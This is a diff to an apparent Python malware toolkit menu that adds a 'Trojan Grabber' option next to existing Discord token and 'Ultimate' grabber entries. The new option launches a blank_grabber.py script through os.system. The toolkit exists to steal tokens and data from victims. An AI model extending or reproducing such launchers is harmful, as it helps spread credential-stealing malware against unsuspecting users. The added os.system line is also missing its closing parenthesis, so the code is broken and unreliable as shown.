@@ -76,6 +76,7 @@ def grabbers():
   print(bcolors.OKBLUE + """
   [1] Discord Token Grabber
   [2] Ultimate Grabber
+  [3] Trojan Grabber
   [0] Back
   """)
   USER_OPTION2 = input(bcolors.OKBLUE +    "[>] ")
@@ -88,6 +89,9 @@ def grabbers():
   elif USER_OPTION2 == "2":
        clearcmd()
        os.system('python ./data/grabber_scripts/ultimate_grabber.py')
+  elif USER_OPTION2 == "3":
+       clearcmd()
+       os.system('python ./data/grabber_scripts/blank_grabber.py'
 
 def zyzz():
   print(bcolors.OKBLUE + "Today's date:",today)
